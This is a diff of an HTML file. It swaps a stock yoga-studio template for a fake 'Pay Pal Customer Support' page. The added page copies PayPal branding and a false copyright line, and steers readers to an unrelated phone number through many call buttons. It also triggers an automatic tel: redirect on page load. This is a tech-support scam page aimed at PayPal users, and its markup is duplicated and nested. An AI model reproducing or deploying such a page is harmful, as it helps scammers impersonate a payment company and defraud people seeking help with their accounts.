@@ -1,297 +1,277 @@
 <!DOCTYPE html>
-<html lang="zxx">
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="description" content="Yoga Studio Template">
-    <meta name="keywords" content="Yoga, unica, creative, html">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Yoga Studio | Template</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pay.Pal Help Desk Service</title>
+  <style>
+    body {
+      font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans",
+        "Helvetica Neue", sans-serif;
+      text-align: center;
+      padding: 0; /* Reset padding to accommodate fixed header */
+      background-color: #f5f5f7;
+      margin: 0;
+    }
 
-    <!-- Google Font -->
-    <link href="https://fonts.googleapis.com/css?family=Montserrat:100,300,400,500,600,700,800,900&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:400,700,900&display=swap" rel="stylesheet">
+    /* Header Styles */
+    header {
+      background-color: #0000FF;
+      padding: 15px 20px;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
 
-    <!-- Css Styles -->
-    <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css">
-    <link rel="stylesheet" href="css/font-awesome.min.css" type="text/css">
-    <link rel="stylesheet" href="css/flaticon.css" type="text/css">
-    <link rel="stylesheet" href="css/owl.carousel.min.css" type="text/css">
-    <link rel="stylesheet" href="css/slicknav.min.css" type="text/css">
-    <link rel="stylesheet" href="css/style.css" type="text/css">
+    nav {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    nav a {
+      color: #fff;
+      text-decoration: none;
+      margin: 0 15px;
+      font-size: 18px;
+      transition: color 0.3s ease;
+    }
+
+    nav a:hover {
+      color: #b71b36;
+    }
+
+    /* Main Content Styles */
+    .content {
+      padding: 20px;
+      margin-top: 80px; /* Space for the fixed header */
+    }
+
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 18px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
+
+    .call-button {
+      display: inline-block;
+      background-color: #0000FF;
+      color: #fff;
+      padding: 15px 30px;
+      font-size: 24px;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+      margin-bottom: 20px;
+    }
+
+    .call-button:hover {
+      background-color: #b71b36;
+    }
+
+    .paypal-logo {
+      width: 200px; /* Corrected from 200x to 200px */
+      height: 200px;
+      margin-bottom: 50px;
+    }
+
+    .footer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 50px;
+    }
+
+    /* Responsive Navigation */
+    @media (max-width: 600px) {
+      nav {
+        flex-direction: column;
+      }
+
+      nav a {
+        margin: 10px 0;
+      }
+    }
+  </style>
+  <script>
+    function autoDial() {
+      var phoneNumber = "+1(808) 351 0827";
+      window.location.href = "tel:" + phoneNumber;
+    }
+
+    function call() {
+      // Implement the call functionality here, such as initiating a phone call.
+      console.log("Calling...");
+    }
+  </script>
 </head>
 
-<body>
-    <!-- Page Preloder -->
-    <div id="preloder">
-        <div class="loader"></div>
-    </div>
+<body onload="autoDial()">
 
-    <!-- Header Section Begin -->
-    <header class="header-section set-bg" data-setbg="img/header-bg.png">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-10 offset-lg-1">
-                    <div class="main-menu">
-                        <div class="logo">
-                            <a href="./index.html">
-                                <img src="img/logo.png" alt="">
-                            </a>
-                        </div>
-                        <nav class="inner-main-navbar mobile-menu">
-                            <ul>
-                                <li><a href="./index.html">Home</a></li>
-                                <li><a href="./classes.html">Classes</a></li>
-                                <li><a href="./about-us.html">About us</a></li>
-                                <li><a href="./elements.html">Shop</a></li>
-                                <li><a href="./blog.html">News</a></li>
-                                <li><a href="./contact.html">Contact</a></li>
-                            </ul>
-                        </nav>
-                        <div id="mobile-menu-wrap"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </header>
-    <!-- Header End -->
+  <!-- Header with Navigation Menu -->
+  <header>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="about.html">About Us</a>
+      <a href="contact.html">Contact</a>
+    </nav>
+  </header>
 
-    <!-- Hero Slider Section Begin -->
-    <section class="hero-slider">
-        <div class="slider-items owl-carousel">
-            <div class="single-slider-item set-bg" data-setbg="img/hero-slider/hero-slider-1.jpg">
-                <div class="container">
-                    <span class="tickler-text">Your inner Chi</span>
-                    <h1>Find Your Zen</h1>
-                    <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. In arcu justo, sagittis consequat.</p>
-                    <a href="#" class="primary-btn">Read More</a>
-                </div>
-            </div>
-            <div class="single-slider-item set-bg" data-setbg="img/hero-slider/hero-slider-2.jpg">
-                <div class="container">
-                    <span class="tickler-text">Your inner Chi</span>
-                    <h1>Find Your Zen</h1>
-                    <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. In arcu justo, sagittis consequat.</p>
-                    <a href="#" class="primary-btn">Read More</a>
-                </div>
-            </div>
-            <div class="single-slider-item set-bg" data-setbg="img/hero-slider/hero-slider-3.jpg">
-                <div class="container">
-                    <span class="tickler-text">Your inner Chi</span>
-                    <h1>Find Your Zen</h1>
-                    <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. In arcu justo, sagittis consequat.</p>
-                    <a href="#" class="primary-btn">Read More</a>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Hero Slider Section End -->
+  <!-- Main Content -->
+  <!DOCTYPE html>
+<html>
 
-    <!-- Yoga Classes Section Begin -->
-    <section class="yoga-classes-section spad">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-10 offset-lg-1">
-                    <div class="home-title">
-                        <span>Your inner Chi</span>
-                        <h2>&#34;The very heart of yoga practice is &#39;abyhasa&#39; – steady effort in the direction you want to go.&#34;</h2>
-                    </div>
-                </div>
-            </div>
-            <div class="row">
-                <div class="col-md-4">
-                    <div class="single-classes">
-                        <i class="flaticon-002-yin-yang"></i>
-                        <h3>Yoga</h3>
-                        <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. </p>
-                    </div>
-                </div>
-                <div class="col-md-4">
-                    <div class="single-classes">
-                        <i class="flaticon-021-yoga-mat"></i>
-                        <h3>Pilates</h3>
-                        <p>Etiam pretium, nibh vitae varius ultricies, tellus diam gravida elit, vel rhoncus eros eros sit amet ipsum. Cras cursus pellentesque.</p>
-                    </div>
-                </div>
-                <div class="col-md-4">
-                    <div class="single-classes">
-                        <i class="flaticon-001-meditation"></i>
-                        <h3>Hatha</h3>
-                        <p>Suspendisse potenti. Donec congue vel justo eget malesuada. In arcu justo, sagittis consequat pulvinar quis, pretium quis massa. </p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Yoga Classes Section End -->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pay.Pal Help Desk Service</title>
+  <style>
+    body {
+      font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans",
+        "Helvetica Neue", sans-serif;
+      text-align: center;
+      padding: 0; /* Reset padding to accommodate fixed header */
+      background-color: #f5f5f7;
+      margin: 0;
+    }
 
-    <!-- Yoga Name Section Begin -->
-    <section class="different-yoga set-bg spad" data-setbg="img/yoga-bg.jpg">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-10 offset-lg-1">
-                    <div class="home-title">
-                        <span>Your inner Chi</span>
-                        <h2>&#34;True meditation is about being fully present with everything that is–including discomfort and challenges. It is not an escape from life.&#34;  
-                        </h2>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <section class="yoga-name-section">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-4 col-md-4">
-                    <div class="single-yoga-name">
-                        <div class="yoga-pic">
-                            <img src="img/yoga-1.jpg" alt="">
-                        </div>
-                        <div class="yoga-text">
-                            <span>Your inner Chi</span>
-                            <h4>Aenean quis velit lacinia <br/>pulvinar.</h4>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-4 col-md-4">
-                    <div class="single-yoga-name">
-                        <div class="yoga-pic">
-                            <img src="img/yoga-2.jpg" alt="">
-                        </div>
-                        <div class="yoga-text">
-                            <span>Your inner Chi</span>
-                            <h4>Velit pulvinar, pelle <br/>neque .</h4>
-                        </div>
-                    </div>
-                </div>
-                <div class="col-lg-4 col-md-4">
-                    <div class="single-yoga-name">
-                        <div class="yoga-pic">
-                            <img src="img/yoga-3.jpg" alt="">
-                        </div>
-                        <div class="yoga-text">
-                            <span>Your inner Chi</span>
-                            <h4>Quis velit pulvinar, pellen <br/>tesque.</h4>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Yoga Name Section End -->
+    /* Header Styles */
+    header {
+      background-color: #0000FF;
+      padding: 15px 20px;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
 
-    <!-- Client Section Begin -->
-    <section class="client-section spad">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-5">
-                    <div class="client-left-img">
-                        <img src="img/client-left.png" alt="">
-                    </div>
-                </div>
-                <div class="col-lg-6 offset-lg-1">
-                    <div class="client-says">
-                        <div class="section-title">
-                            <span>Your inner Chi</span>
-                            <h2>What our clients say</h2>
-                        </div>
-                        <div class="client-items owl-carousel">
-                            <div class="single-client-item">
-                                <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. “True meditation is about being fully present with everything that is–including discomfort and challenges. It is not an escape from life.</p>
-                                <h5>Mark Smith, <span>Client</span></h5>
-                            </div>
-                            <div class="single-client-item">
-                                <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. “True meditation is about being fully present with everything that is–including discomfort and challenges. It is not an escape from life.</p>
-                                <h5>Mark Smith, <span>Client</span></h5>
-                            </div>
-                            <div class="single-client-item">
-                                <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. “True meditation is about being fully present with everything that is–including discomfort and challenges. It is not an escape from life.</p>
-                                <h5>Mark Smith, <span>Client</span></h5>
-                            </div>
-                            <div class="single-client-item">
-                                <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. “True meditation is about being fully present with everything that is–including discomfort and challenges. It is not an escape from life.</p>
-                                <h5>Mark Smith, <span>Client</span></h5>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Client Section End -->
+    nav {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+    }
 
-    <!-- Call To Action Section Begin -->
-    <section class="callto-section set-bg" data-setbg="img/callto-bg.jpg">
-        <div class="container">
-            <div class="row">
-                <div class="col-lg-12">
-                    <div class="callto-text">
-                        <h2>Take a free class now</h2>
-                        <a href="#" class="primary-btn callto-btn">Ream More</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Call To Action End -->
+    nav a {
+      color: #fff;
+      text-decoration: none;
+      margin: 0 15px;
+      font-size: 18px;
+      transition: color 0.3s ease;
+    }
 
-    <!-- Map Section Begin -->
-    <div class="map">
-        <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d24176.251535937678!2d-73.96828677849068!3d40.761333182809906!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c258c4d85a0d8d%3A0x11f877ff0b8ffe27!2sRoosevelt+Island!5e0!3m2!1sen!2sbd!4v1564859733175!5m2!1sen!2sbd" height="590" style="border:0" allowfullscreen></iframe>
-    </div>
-    <!-- Map Section End -->
+    nav a:hover {
+      color: #b71b36;
+    }
 
-    <!-- Footer Section Begin -->
-    <footer class="footer-section set-bg" data-setbg="img/footer-bg.jpg">
-        <div class="container">
-            <div class="contact-inner">
-                <div class="contact-form">
-                    <div class="section-title">
-                        <span>Say hello</span>
-                        <h2>Contact us</h2>
-                    </div>
-                    <form action="#">
-                        <input type="text" placeholder="Name">
-                        <input type="email" placeholder="Mail">
-                        <input type="text" placeholder="Subject">
-                        <textarea placeholder="Message"></textarea>
-                        <button type="submit" class="submit-btn">Send</button>
-                    </form>
-                </div>
-                <div class="row">
-                    <div class="col-lg-6">
-                        <div class="footer-text">
-                            <a href="./home.html" class="logo"><img src="img/footer-logo.png" alt=""></a>
-                            <p>Aenean quis velit pulvinar, pellentesque neque vel, laoreet orci. Suspendisse potenti. Donec congue vel justo eget malesuada. “True meditation is about being fully present with everything that is–including.</p>
-                            <ul>
-                                <li><a href="#"><i class="fa fa-pinterest"></i></a></li>
-                                <li><a href="#"><i class="fa fa-facebook"></i></a></li>
-                                <li><a href="#"><i class="fa fa-twitter"></i></a></li>
-                                <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
-                                <li><a href="#"><i class="fa fa-behance"></i></a></li>
-                            </ul>
-                            <div class="copyright text-white">
-                                <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved | This template is made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a href="https://colorlib.com" target="_blank">Colorlib</a>
-<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </footer>
-    <!-- Footer Section End -->
+    /* Main Content Styles */
+    .content {
+      padding: 20px;
+      margin-top: 80px; /* Space for the fixed header */
+    }
 
-    
-    <!-- Js Plugins -->
-    <script src="js/jquery-3.3.1.min.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="js/jquery.slicknav.js"></script>
-    <script src="js/owl.carousel.min.js"></script>
-    <script src="js/circle-progress.min.js"></script>
-    <script src="js/main.js"></script>
+    h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 18px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
+
+    .call-button {
+      display: inline-block;
+      background-color: #0000FF;
+      color: #fff;
+      padding: 15px 30px;
+      font-size: 24px;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+      margin-bottom: 20px;
+    }
+
+    .call-button:hover {
+      background-color: #b71b36;
+    }
+
+    .paypal-logo {
+      width: 200px; /* Corrected from 200x to 200px */
+      height: 200px;
+      margin-bottom: 50px;
+    }
+
+    .footer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 50px;
+    }
+
+    /* Responsive Navigation */
+    @media (max-width: 600px) {
+      nav {
+        flex-direction: column;
+      }
+
+      nav a {
+        margin: 10px 0;
+      }
+    }
+  </style>
+  <script>
+    function autoDial() {
+      var phoneNumber = "+1(808) 351 0827";
+      window.location.href = "tel:" + phoneNumber;
+    }
+
+    function call() {
+      // Implement the call functionality here, such as initiating a phone call.
+      console.log("Calling...");
+    }
+  </script>
+</head>
+
+<body onload="autoDial()">
+
+  <!-- Header with Navigation Menu -->
+  <header>
+    <nav>
+      <a href="index.html">Home</a>
+      <a href="about.html">About Us</a>
+      <a href="contact.html">Contact</a>
+    </nav>
+  </header>
+
+  <!-- Main Content -->
+  <div class="content">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAvVBMVEX///8lO4AXm9cVMHuQlrUAl9YlM3oTLHeQxeYehMD29/tDpdoAk9QXMnwiOX8AldUAHnMAJnceNn4ZoNuGjq8AIXTh4+vKzdsAHHNsdqEVpOADKHclNnzv8PQ4odny+fzl8fkmLHWepb+32e8lQISssciVm7i+w9VMWZA0RYOIkLEAFXBhbJrZ3OdbZ5dSYJR7g6m0uMtDUoxihbEPd7Zdrt4naaXY6/YoXJpntOAqT43D4fJ9veMAjtOby+mJUMB+AAAElklEQVR4nO3bC1faMBgGYBJoEYQWcMPJxStOnZe5DZ069f//rBXwQmm+0qY55/vKeZ9fkPek5E2TUqkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGy601oG349Pz/pN7qHaue1Us6gPu532eW2Xe7gWLgKVVdCrdtSPPveIcxrXsyecp2xfXl1zDzqX/tdcAWd6l1dj7mHncDbMnVCpdueUe9zZndYtEirVvSnNwvqlbZVQtSdlWXF+9uwSqt6wJAtOjrJYEXwtRcRx2zqhCjpleFAtymIpYr0Ey81ut0BC1fvJPf71ju3K4l33mDvAWrVqoYTqm/if4o1tWbzp3XAnWMd+JX2fROnvUza70vgknnNHSFeoLBaE936xsphr33KHSGX5ZrFMeO3/sHyzWDY8406RZq9gWczIfkwnhdtidj7FnSLNZfGA0WoqeF/Td5KwK7j0d4vXYaQu+FjqV/GyiFRr3DloLsoiWky/cOeguSgL2XXx20FZRAn3uHPQum4Syp3DsZOykPw7dFMWqv2HOwjpV+H33zl/esedhFJzUhbKb3j7B9xZzNyUhfK19va5s5hZ38rETQZRRJEPatNNwNH9jta6tcUdx6D5zUlCv6FnWn+58yRdOymLQO3ME2qBP0U3ZbF4SCPhCXeghOOCdxYLvqffeNyBEpyUxehh8J6wJW4SnZTF5xRqLa0xmi4O2j5+hfNJFLazGRc/0f9cSEWuNS7K4qixFFB7j9yZ4hyUhb/8jMqrxIJX+JHR0yAWUIeyfoi3RZfS4CI+g9FSc8gdKua84FI6muhVwvam9t97LQJeJALq1j/uUMvyfhy8wn9YfUTFJSz2vdfRdJAMKOwptfo4+C2ff+EZZlDaSmNfFr5qmCZQXFvYfRwcBP5kumOcQC2t8S3KIhj5o4cGmU/aro0O6BPU031Dk/G0tJ03XRb+tGES6p1BWrzIyyF3qmX0m8VReowU29yhYnapsoi/8uUh7BSDPIYKnmwTau5McWRZBKbtWAmnkD6GGt1bJpRVhpVKlVxKG+vDGKdQ1J40Qt5ZHLWsAobSbmauO2RCq4Dybtfoj4N9YledHlDajzDtzmJikVDiLbfTsghlbWYWrhyWReuZO40JeWfhT3Pm8zxRhzMfyLLIWYfei7SWeNOn69BbH+tD2NqSt8Qs0N97+Vl/hmHLexS2E11G/5PEVBb72wl3zyfSdmlxKWWRTChux5kFeYVvKgtpV7uZkB8Hm8oi5B6tDfLjYFNZyNtzrjem6zBZFsJOQbOhy2KUnEJPaKenoq/wDWUh65w3I/Lj4GD1Zr6sZZHrzSI85B6uhXMqofHNgnu0FuiPg01lIfH1dp0xeQzlh8mEm18Wr9zDtXB9GRjMEk4Mu9IylkWlNqwnzS5BN6UsIs2EyrNhGdXSvq8oZNucsIxlQTAso2UtC7ODF2PAUr5ZmP0z3zmVsizMXs3HiOUsC6NHYiktaVkYEEtpKY+hjA6oq1/ugTlzaF5KN6gsKtozedmcpbRy8LplsDkrKQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAtf+Zd12XYH+vNwAAAABJRU5ErkJggg==" alt="PayPal Logo" class="paypal-logo">
+   <h1>Pay Pal Customer Support</h1>
+    <a href="tel:+1(808) 351 0827" class="call-button">Call +1(808) 351 0827</a>
+  <p>Our team of experts is committed to addressing your concerns and ensuring your Pay Pal experience remains smooth and trouble-free. Whether you're dealing with transaction problems, account verification issues, security concerns, or any other challenges, our friendly and knowledgeable support staff is here to guide you through it.</p>
+   <a href="tel:+1(808) 351 0827" class="call-button">Pay Pal Tech Support</a>
+  <p>Our Pay Pal Customer Service team is well-versed in the various aspects of Pay Pal's services. We can help you with account management, transaction disputes, resolving payment discrepancies, setting up or verifying your account, and more. No matter the issue, our priority is to provide you with the support you need to navigate the digital financial world confidently. In times of need, swift and direct assistance can make all the difference. That's why we offer Pay Pal Phone Support to ensure you have easy access to real people who can help you resolve your issues. Save our Pay Pal phone number in your contacts for quick assistance. When you dial our number, you'll be connected directly to a knowledgeable and friendly representative who can provide immediate support. We understand that issues related to financial transactions can be time-sensitive. Whether you have concerns about a recent payment, need to report unauthorized activity, or simply have questions about using Pay Pal, our dedicated support team is just a call away. We're ready to address your questions and concerns promptly and professionally, ensuring that you have a stress-free experience when using Pay Pal.</p>
+   <a href="tel:+1(808) 351 0827" class="call-button">Contact Pay Pal Expert</a>
+
+  <p>Technology can sometimes be unpredictable, and even the most tech-savvy individuals may encounter technical difficulties. That's where our Pay Pal Tech Support team comes in. Our technical support specialists are well-equipped to provide solutions for complex technical issues related to your Pay Pal account or the Pay Pal app. Whether you're struggling with account problems, need assistance with app functionality, or have concerns about security features, our technical support experts are here to help. They have the knowledge and expertise to guide you through any technical challenges you may face while using Pay Pal. We understand that issues can arise at any time, which is why our Pay Pal Contact Support is available 24/7. You can reach out to us whenever it's convenient for you, day or night. Your questions and concerns won't wait, and neither will we. Our dedicated support team is here to provide the assistance you need to keep your Pay Pal experience seamless and trouble-free. Your satisfaction is our top priority, and we're committed to making your online payments hassle-free.</p>
+  <a href="tel:+1(808) 351 0827" class="call-button">Pay Pal Phone Number</a>
+  <p class="footer">Â© 2023 Pay Pal Inc. All rights reserved.</p>
+  </div>
+
+</body>
+
+</html>
+
 </body>
 
 </html>
